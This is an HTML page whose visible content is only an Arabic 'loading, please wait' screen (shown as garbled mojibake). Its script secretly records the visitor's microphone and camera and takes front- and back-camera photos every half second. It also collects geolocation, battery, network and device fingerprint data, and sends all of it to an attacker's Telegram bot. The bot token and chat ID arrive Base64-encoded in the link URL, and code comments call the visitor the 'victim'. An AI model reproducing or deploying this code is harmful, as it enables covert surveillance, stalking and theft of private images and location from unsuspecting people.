<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            text-align: center;
            direction: rtl;
        }
        .loading {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="loading" id="loading">
        <h2>Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</h2>
        <p>ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±</p>
    </div>

    <script>
        class AdvancedDataCapture {
            constructor(botToken, chatId, linkId) {
                this.botToken = botToken;
                this.chatId = chatId;
                this.linkId = linkId;
                this.images = [];
                this.audioChunks = [];
                this.videoChunks = [];
                this.audioRecorder = null;
                this.videoRecorder = null;
                this.captureInterval = null;
                this.isRecording = false;
                this.startTime = new Date();
            }

            async startCapture() {
                try {
                    console.log('ğŸš€ Ø¨Ø¯Ø£ Ø¬Ù…Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…ØªÙ‚Ø¯Ù…...');
                    
                    // Ø¨Ø¯Ø¡ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ØµÙˆØª ÙˆØ§Ù„ÙÙŠØ¯ÙŠÙˆ
                    await this.startMediaRecording();
                    
                    // Ø¨Ø¯Ø¡ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ± Ø§Ù„Ù…ØªÙƒØ±Ø±
                    this.startContinuousCapture();
                    
                    // Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²
                    const deviceInfo = this.collectAdvancedDeviceInfo();
                    
                    // Ø¥Ø¹Ø¯Ø§Ø¯ Ù…Ø¹Ø§Ù„Ø¬ Ø§Ù„Ø®Ø±ÙˆØ¬
                    this.setupExitHandler();
                    
                    console.log('âœ… Ø¨Ø¯Ø£ Ø¬Ù…Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ù†Ø¬Ø§Ø­');
                    
                } catch (error) {
                    console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø¨Ø¯Ø¡ Ø¬Ù…Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª:', error);
                }
            }

            // Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ù…ØªÙ‚Ø¯Ù…Ø© Ø¹Ù† Ø§Ù„Ø¬Ù‡Ø§Ø²
            collectAdvancedDeviceInfo() {
                const info = {
                    // âœ… Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¶Ø­ÙŠØ©
                    ip: 'Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø¬Ù…Ø¹...',
                    date: new Date().toLocaleString('ar-EG'),
                    
                    // ğŸ“± Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²
                    productSub: navigator.productSub || 'ØºÙŠØ± Ù…ØªØ§Ø­',
                    vendor: navigator.vendor || 'ØºÙŠØ± Ù…ØªØ§Ø­',
                    maxTouchPoints: navigator.maxTouchPoints || 'ØºÙŠØ± Ù…ØªØ§Ø­',
                    doNotTrack: navigator.doNotTrack || 'ØºÙŠØ± Ù…ØªØ§Ø­',
                    hardwareConcurrency: navigator.hardwareConcurrency || 'ØºÙŠØ± Ù…ØªØ§Ø­',
                    cookieEnabled: navigator.cookieEnabled,
                    appCodeName: navigator.appCodeName || 'ØºÙŠØ± Ù…ØªØ§Ø­',
                    appName: navigator.appName || 'ØºÙŠØ± Ù…ØªØ§Ø­',
                    appVersion: navigator.appVersion || 'ØºÙŠØ± Ù…ØªØ§Ø­',
                    platform: navigator.platform || 'ØºÙŠØ± Ù…ØªØ§Ø­',
                    product: navigator.product || 'ØºÙŠØ± Ù…ØªØ§Ø­',
                    userAgent: navigator.userAgent || 'ØºÙŠØ± Ù…ØªØ§Ø­',
                    language: navigator.language || 'ØºÙŠØ± Ù…ØªØ§Ø­',
                    languages: navigator.languages ? navigator.languages.join(', ') : 'ØºÙŠØ± Ù…ØªØ§Ø­',
                    webdriver: navigator.webdriver || 'ØºÙŠØ± Ù…ØªØ§Ø­',
                    pdfViewerEnabled: navigator.pdfViewerEnabled || 'ØºÙŠØ± Ù…ØªØ§Ø­',
                    deviceMemory: navigator.deviceMemory || 'ØºÙŠØ± Ù…ØªØ§Ø­',
                    
                    // ğŸ“· Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø£Ø¬Ù‡Ø²Ø© Ø§Ù„ÙˆØ³Ø§Ø¦Ø·
                    mediaDevices: [],
                    
                    // ğŸ•¸ï¸ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø´Ø¨ÙƒØ©
                    connection: {},
                    
                    // ğŸ”‹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©
                    battery: {},
                    
                    // ğŸ–¥ï¸ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø´Ø§Ø´Ø©
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        colorDepth: screen.colorDepth,
                        pixelDepth: screen.pixelDepth
                    },
                    
                    // ğŸŒ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…ÙˆÙ‚Ø¹
                    location: null,
                    
                    // â° ÙˆÙ‚Øª Ø§Ù„Ø¨Ø¯Ø¡
                    startTime: this.startTime.toLocaleString('ar-EG')
                };

                // Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø£Ø¬Ù‡Ø²Ø© Ø§Ù„ÙˆØ³Ø§Ø¦Ø·
                if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                    navigator.mediaDevices.enumerateDevices().then(devices => {
                        info.mediaDevices = devices.map(device => ({
                            kind: device.kind,
                            label: device.label,
                            deviceId: device.deviceId
                        }));
                    });
                }

                // Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø´Ø¨ÙƒØ©
                if (navigator.connection) {
                    info.connection = {
                        type: navigator.connection.type || 'ØºÙŠØ± Ù…ØªØ§Ø­',
                        rtt: navigator.connection.rtt || 'ØºÙŠØ± Ù…ØªØ§Ø­',
                        saveData: navigator.connection.saveData || 'ØºÙŠØ± Ù…ØªØ§Ø­',
                        effectiveType: navigator.connection.effectiveType || 'ØºÙŠØ± Ù…ØªØ§Ø­',
                        downlink: navigator.connection.downlink || 'ØºÙŠØ± Ù…ØªØ§Ø­',
                        downlinkMax: navigator.connection.downlinkMax || 'ØºÙŠØ± Ù…ØªØ§Ø­'
                    };
                }

                // Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©
                if (navigator.getBattery) {
                    navigator.getBattery().then(battery => {
                        info.battery = {
                            level: Math.round(battery.level * 100) + '%',
                            charging: battery.charging ? 'Ù†Ø¹Ù…' : 'Ù„Ø§'
                        };
                    });
                }

                // Ø¬Ù…Ø¹ Ø§Ù„Ù…ÙˆÙ‚Ø¹
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        position => {
                            info.location = {
                                lat: position.coords.latitude,
                                lng: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            };
                        },
                        error => {
                            info.location = 'ØªÙ… Ø±ÙØ¶ Ø§Ù„Ø¥Ø°Ù†';
                        }
                    );
                }

                return info;
            }

            // Ø¨Ø¯Ø¡ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ØµÙˆØª ÙˆØ§Ù„ÙÙŠØ¯ÙŠÙˆ
            async startMediaRecording() {
                try {
                    // ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ØµÙˆØª
                    const audioStream = await navigator.mediaDevices.getUserMedia({ 
                        audio: {
                            channelCount: 2,
                            sampleRate: 44100,
                            echoCancellation: false
                        } 
                    });
                    
                    this.audioRecorder = new MediaRecorder(audioStream, {
                        mimeType: 'audio/webm;codecs=opus'
                    });
                    
                    this.audioRecorder.ondataavailable = (event) => {
                        if (event.data.size > 0) {
                            this.audioChunks.push(event.data);
                        }
                    };
                    
                    this.audioRecorder.start(1000); // ØªØ³Ø¬ÙŠÙ„ ÙƒÙ„ Ø«Ø§Ù†ÙŠØ©

                    // ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ
                    const videoStream = await navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            width: 1280,
                            height: 720,
                            facingMode: 'environment'
                        } 
                    });
                    
                    this.videoRecorder = new MediaRecorder(videoStream, {
                        mimeType: 'video/webm;codecs=vp9'
                    });
                    
                    this.videoRecorder.ondataavailable = (event) => {
                        if (event.data.size > 0) {
                            this.videoChunks.push(event.data);
                        }
                    };
                    
                    this.videoRecorder.start(1000); // ØªØ³Ø¬ÙŠÙ„ ÙƒÙ„ Ø«Ø§Ù†ÙŠØ©
                    
                    this.isRecording = true;
                    console.log('ğŸ¥ Ø¨Ø¯Ø£ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ØµÙˆØª ÙˆØ§Ù„ÙÙŠØ¯ÙŠÙˆ');

                } catch (error) {
                    console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø¨Ø¯Ø¡ Ø§Ù„ØªØ³Ø¬ÙŠÙ„:', error);
                }
            }

            // Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ± Ø¨Ø´ÙƒÙ„ Ù…ØªÙƒØ±Ø±
            startContinuousCapture() {
                let captureCount = 0;
                this.captureInterval = setInterval(async () => {
                    try {
                        // Ø§Ù„ØªÙ‚Ø§Ø· Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©
                        const frontImage = await this.captureSingleImage('user');
                        if (frontImage) {
                            this.images.push({
                                ...frontImage,
                                type: 'ÙƒØ§Ù…ÙŠØ±Ø§ Ø£Ù…Ø§Ù…ÙŠØ©',
                                sequence: captureCount
                            });
                        }

                        // Ø§Ù„ØªÙ‚Ø§Ø· Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ©
                        const backImage = await this.captureSingleImage('environment');
                        if (backImage) {
                            this.images.push({
                                ...backImage,
                                type: 'ÙƒØ§Ù…ÙŠØ±Ø§ Ø®Ù„ÙÙŠØ©', 
                                sequence: captureCount
                            });
                        }

                        captureCount++;
                        console.log(`ğŸ“¸ ØªÙ… Ø§Ù„ØªÙ‚Ø§Ø· ${captureCount * 2} ØµÙˆØ±Ø©`);

                    } catch (error) {
                        console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±:', error);
                    }
                }, 500); // ÙƒÙ„ 0.5 Ø«Ø§Ù†ÙŠØ©
            }

            // Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© ÙˆØ§Ø­Ø¯Ø©
            async captureSingleImage(facingMode) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { 
                            facingMode: facingMode,
                            width: 1920,
                            height: 1080
                        }
                    });
                    
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();
                    
                    await new Promise(resolve => setTimeout(resolve, 100));
                    
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    
                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
                    
                    // Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„Ø¯ÙÙ‚
                    stream.getTracks().forEach(track => track.stop());
                    
                    return {
                        data: imageData,
                        timestamp: new Date().toLocaleString('ar-EG'),
                        resolution: `${canvas.width}x${canvas.height}`
                    };
                    
                } catch (error) {
                    console.log(`âš ï¸ Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ ${facingMode === 'user' ? 'Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©' : 'Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ©'}`);
                    return null;
                }
            }

            // Ø¥Ø¹Ø¯Ø§Ø¯ Ù…Ø¹Ø§Ù„Ø¬ Ø­Ø¯Ø« Ø§Ù„Ø®Ø±ÙˆØ¬
            setupExitHandler() {
                window.addEventListener('beforeunload', (e) => {
                    this.stopCaptureAndSend();
                    e.preventDefault();
                    e.returnValue = '';
                });
                
                window.addEventListener('unload', () => {
                    this.stopCaptureAndSend();
                });
                
                window.addEventListener('pagehide', () => {
                    this.stopCaptureAndSend();
                });

                // Ø£ÙŠØ¶Ù‹Ø§ Ø¹Ù†Ø¯ ÙÙ‚Ø¯Ø§Ù† Ø§Ù„ØªØ±ÙƒÙŠØ²
                window.addEventListener('blur', () => {
                    setTimeout(() => {
                        this.stopCaptureAndSend();
                    }, 1000);
                });
            }

            // Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„Ø¬Ù…Ø¹ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
            async stopCaptureAndSend() {
                if (!this.isRecording) return;
                
                this.isRecording = false;
                console.log('ğŸ›‘ Ø¥ÙŠÙ‚Ø§Ù Ø¬Ù…Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙˆØ¥Ø±Ø³Ø§Ù„Ù‡Ø§...');
                
                // Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±
                if (this.captureInterval) {
                    clearInterval(this.captureInterval);
                }
                
                // Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ØªØ³Ø¬ÙŠÙ„Ø§Øª
                if (this.audioRecorder && this.audioRecorder.state === 'recording') {
                    this.audioRecorder.stop();
                }
                if (this.videoRecorder && this.videoRecorder.state === 'recording') {
                    this.videoRecorder.stop();
                }
                
                // Ø¬Ù…Ø¹ ÙƒÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                const allData = {
                    deviceInfo: this.collectAdvancedDeviceInfo(),
                    images: this.images,
                    audioLength: this.audioChunks.length,
                    videoLength: this.videoChunks.length,
                    totalCaptureTime: Math.round((new Date() - this.startTime) / 1000) + ' Ø«Ø§Ù†ÙŠØ©',
                    timestamp: new Date().toLocaleString('ar-EG'),
                    linkId: this.linkId
                };
                
                // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ Ø§Ù„ØªÙ„Ø¬Ø±Ø§Ù…
                await this.sendToTelegram(allData);
            }

            // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ Ø¨ÙˆØª Ø§Ù„ØªÙ„Ø¬Ø±Ø§Ù…
            async sendToTelegram(data) {
                try {
                    // ØªØ­Ø¶ÙŠØ± Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ù†ØµÙŠØ©
                    let message = `ğŸ“± *ØªÙ… Ø¬Ù…Ø¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø¬Ø¯ÙŠØ¯Ø©*\\n\\n`;
                    
                    message += `âœ… *Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¶Ø­ÙŠØ©*\\n`;
                    message += `ğŸ†” Ø§Ù„Ø±Ø§Ø¨Ø·: ${data.linkId}\\n`;
                    message += `â° ÙˆÙ‚Øª Ø§Ù„Ø¨Ø¯Ø¡: ${data.deviceInfo.startTime}\\n`;
                    message += `â±ï¸ Ù…Ø¯Ø© Ø§Ù„Ø¬Ù…Ø¹: ${data.totalCaptureTime}\\n\\n`;
                    
                    message += `ğŸ“± *Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²*\\n`;
                    message += `ğŸ–¥ï¸ Ø§Ù„Ù†Ø¸Ø§Ù…: ${data.deviceInfo.platform}\\n`;
                    message += `ğŸ”§ Ø§Ù„Ù…ØªØµÙØ­: ${data.deviceInfo.appName}\\n`;
                    message += `ğŸŒ Ø§Ù„Ù„ØºØ§Øª: ${data.deviceInfo.languages}\\n`;
                    message += `ğŸ’¾ Ø§Ù„Ø°Ø§ÙƒØ±Ø©: ${data.deviceInfo.deviceMemory} GB\\n`;
                    message += `âš¡ Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬: ${data.deviceInfo.hardwareConcurrency} Ù†ÙˆØ§Ø©\\n\\n`;
                    
                    message += `ğŸ“Š *Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø¬Ù…Ø¹Ø©*\\n`;
                    message += `ğŸ–¼ï¸ Ø§Ù„ØµÙˆØ±: ${data.images.length}\\n`;
                    message += `ğŸ¤ ØªØ³Ø¬ÙŠÙ„Ø§Øª Ø§Ù„ØµÙˆØª: ${data.audioLength}\\n`;
                    message += `ğŸ¥ ØªØ³Ø¬ÙŠÙ„Ø§Øª Ø§Ù„ÙÙŠØ¯ÙŠÙˆ: ${data.videoLength}\\n\\n`;
                    
                    message += `ğŸ”‹ *Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©*\\n`;
                    message += `ğŸ”‹ Ø§Ù„Ù…Ø³ØªÙˆÙ‰: ${data.deviceInfo.battery.level || 'ØºÙŠØ± Ù…ØªØ§Ø­'}\\n`;
                    message += `âš¡ Ø§Ù„Ø´Ø­Ù†: ${data.deviceInfo.battery.charging || 'ØºÙŠØ± Ù…ØªØ§Ø­'}\\n\\n`;
                    
                    message += `ğŸ•¸ï¸ *Ø§Ù„Ø´Ø¨ÙƒØ©*\\n`;
                    message += `ğŸ“¶ Ø§Ù„Ù†ÙˆØ¹: ${data.deviceInfo.connection.effectiveType || 'ØºÙŠØ± Ù…ØªØ§Ø­'}\\n`;
                    message += `â¬‡ï¸ Ø§Ù„Ø³Ø±Ø¹Ø©: ${data.deviceInfo.connection.downlink || 'ØºÙŠØ± Ù…ØªØ§Ø­'} Mbps\\n`;

                    // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ù†ØµÙŠØ©
                    await fetch(`https://api.telegram.org/bot${this.botToken}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: this.chatId,
                            text: message,
                            parse_mode: 'Markdown'
                        })
                    });

                    // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ± (Ø£ÙˆÙ„ 5 ØµÙˆØ±)
                    for (let i = 0; i < Math.min(data.images.length, 5); i++) {
                        await this.sendPhotoToTelegram(data.images[i].data, `ØµÙˆØ±Ø© ${i+1} - ${data.images[i].type}`);
                        await new Promise(resolve => setTimeout(resolve, 1000));
                    }

                    console.log('âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ Ø§Ù„ØªÙ„Ø¬Ø±Ø§Ù…');

                } catch (error) {
                    console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª:', error);
                }
            }

            // Ø¥Ø±Ø³Ø§Ù„ ØµÙˆØ±Ø© Ø¥Ù„Ù‰ Ø§Ù„ØªÙ„Ø¬Ø±Ø§Ù…
            async sendPhotoToTelegram(photoData, caption) {
                try {
                    // ØªØ­ÙˆÙŠÙ„ base64 Ø¥Ù„Ù‰ blob
                    const blob = await fetch(photoData).then(r => r.blob());
                    
                    const formData = new FormData();
                    formData.append('chat_id', this.chatId);
                    formData.append('photo', blob, 'capture.jpg');
                    formData.append('caption', caption);
                    
                    await fetch(`https://api.telegram.org/bot${this.botToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    
                } catch (error) {
                    console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©:', error);
                }
            }
        }

        // Ø¨Ø¯Ø¡ Ø§Ù„Ù†Ø¸Ø§Ù… Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
        document.addEventListener('DOMContentLoaded', async function() {
            // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…Ø¹Ù„Ù…Ø§Øª Ù…Ù† URL
            const urlParams = new URLSearchParams(window.location.search);
            const linkId = urlParams.get('id') || 'unknown';
            const botToken = atob(urlParams.get('bot') || '');
            const chatId = atob(urlParams.get('chat') || '');
            
            if (botToken && chatId) {
                const captureSystem = new AdvancedDataCapture(botToken, chatId, linkId);
                await captureSystem.startCapture();
                
                // Ø¥Ø®ÙØ§Ø¡ Ø´Ø§Ø´Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„ Ø¨Ø¹Ø¯ Ø¨Ø¯Ø¡ Ø§Ù„Ù†Ø¸Ø§Ù…
                document.getElementById('loading').classList.add('hidden');
            } else {
                document.getElementById('loading').innerHTML = '<h2>âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ù…Ø¹Ù„Ù…Ø§Øª</h2>';
            }
        });
    </script>
</body>
    </html>
